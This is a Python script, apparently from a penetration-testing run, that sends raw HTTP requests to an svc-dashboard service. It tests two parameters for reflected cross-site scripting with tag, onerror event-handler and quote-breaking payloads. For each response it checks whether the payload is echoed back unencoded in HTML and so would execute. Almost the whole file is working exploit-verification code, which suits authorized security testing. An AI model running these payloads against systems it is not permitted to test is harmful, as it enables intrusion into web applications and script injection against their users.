#!/usr/bin/env python3
# INT-r27-0029: svc-dashboard 反射 XSS 双面验证 (/render?tpl= 与 /report?name=)
# Round2 线索: 参数值以 raw 串（未 urldecode、未 HTML 转义）拼接回显进 text/html 元素上下文
# 本轮: 三载荷形原形直发(不编码)优先 + 编码形对照负
# 判据: 响应体未编码回显探针串 dash8k2 且标签结构原样 = 可执行反射
# 注: HTTP 请求行禁空格 → quote 形原形(含空格)仅编码可发; 另发无空格 raw 适配形探引号透传
import socket, json, time

HOST, PORT = "svc-dashboard", 8006
PROBE = "dash8k2"

FACES = [("/render", "tpl"), ("/report", "name")]

# (form_tag, wire_value, mode)  mode: raw=原形直发 / enc=编码对照
CASES = [
    ("tag-raw",       "<b>dash8k2</b>",                      "raw"),
    ("event-raw",     "<img/src=x/onerror=dash8k2>",         "raw"),
    ("quote-raw-ns",  '"onmouseover=dash8k2"',               "raw"),
    ("tag-enc-ctl",   "%3Cb%3Edash8k2%3C%2Fb%3E",            "enc"),
    ("quote-enc-ctl", "%22%20onmouseover%3Ddash8k2%20%22",   "enc"),
]


def send_raw(path):
    req = ("GET %s HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n" % path).encode("latin-1")
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.sendall(req)
    buf = b""
    while True:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        head, _, body = buf.partition(b"\r\n\r\n")
        if head:
            cl = None
            for ln in head.decode("latin-1").split("\r\n")[1:]:
                if ln.lower().startswith("content-length:"):
                    cl = int(ln.split(":", 1)[1].strip())
            if cl is not None and len(body) >= cl:
                break
    s.close()
    head, _, body = buf.partition(b"\r\n\r\n")
    lines = head.decode("latin-1").split("\r\n")
    status = int(lines[0].split()[1])
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body.decode("latin-1"), req


def judge(form_tag, payload, body):
    """executable: 探针串未编码在场 且 载荷结构原样(逐字节子串)"""
    structure_intact = payload in body if form_tag.endswith("raw") or form_tag == "quote-raw-ns" else False
    probe_bare = PROBE in body
    if form_tag == "tag-raw":
        structure_intact = "<b>dash8k2</b>" in body
    elif form_tag == "event-raw":
        structure_intact = "<img/src=x/onerror=dash8k2>" in body
    elif form_tag == "quote-raw-ns":
        structure_intact = '"onmouseover=dash8k2"' in body
    elif form_tag in ("tag-enc-ctl", "quote-enc-ctl"):
        structure_intact = False  # 编码形按定义不判可执行
    return probe_bare, structure_intact


results = []
verdicts = {}
for path, param in FACES:
    face_exec = []
    for form_tag, payload, mode in CASES:
        time.sleep(0.5)
        wire = payload if mode == "raw" else payload  # CASES 中 enc 形已内联为编码串
        p = "%s?%s=%s" % (path, param, wire)
        case_id = "%s:%s:%s" % (path, param, form_tag)
        try:
            st, hd, body, req = send_raw(p)
            probe_bare, structure_intact = judge(form_tag, wire, body)
            executable = bool(probe_bare and structure_intact and st == 200
                              and "text/html" in hd.get("content-type", ""))
            if mode == "raw" and form_tag in ("tag-raw", "event-raw"):
                face_exec.append(executable)
            results.append({
                "case": case_id, "form": form_tag, "mode": mode, "payload_wire": wire,
                "raw_request": "GET %s HTTP/1.1\r\nHost: svc-dashboard:8006\r\n\r\n" % p,
                "status": st, "headers": hd, "body": body, "body_len": len(body),
                "probe_bare_in_body": probe_bare, "structure_intact": structure_intact,
                "executable_reflection": executable,
                "encoded_reflected_verbatim": (mode == "enc" and wire in body),
            })
        except Exception as e:
            results.append({"case": case_id, "form": form_tag, "mode": mode,
                            "payload_wire": wire, "error": repr(e)})
    verdicts[path] = {"param": param,
                      "xss_confirmed": bool(face_exec and all(face_exec)),
                      "hits": sum(face_exec)}

print(json.dumps({"intent": "INT-r27-0029", "target": "svc-dashboard:8006",
                  "probe_token": PROBE, "count": len(results),
                  "verdicts": verdicts, "results": results}, ensure_ascii=False))
